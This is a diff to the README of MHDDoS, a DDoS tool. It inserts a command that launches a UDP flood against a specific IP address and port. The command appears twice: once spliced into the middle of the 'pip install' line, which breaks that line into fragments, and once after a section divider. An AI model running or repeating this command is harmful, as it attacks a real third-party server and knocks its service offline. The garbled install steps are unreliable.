@@ -131,7 +131,9 @@ You can read it from [GitHub Wiki](https://github.com/MatrixTM/MHDDoS/wiki)
 ```shell script
 git clone https://github.com/MatrixTM/MHDDoS.git
 cd MHDDoS
-pip install -r requirements.txt
+pip 
+python3 /workspaces/MHDDoS/start.py UDP 38.54.44.181:10017 53 999
+ -r requirements.txt
 ```
 
 **One-Line Installing on Fresh VPS**
@@ -144,6 +146,8 @@ apt -y update && apt -y install curl wget libcurl4 libssl-dev python3 python3-pi
 [github issues]: https://github.com/MatrixTM/MHDDoS/issues 'enter'
 
 ---
+python3 /workspaces/MHDDoS/start.py UDP 38.54.44.181:10017 53 999
+
 
 ## Need a Cheap Hourly Server? No Problem
 
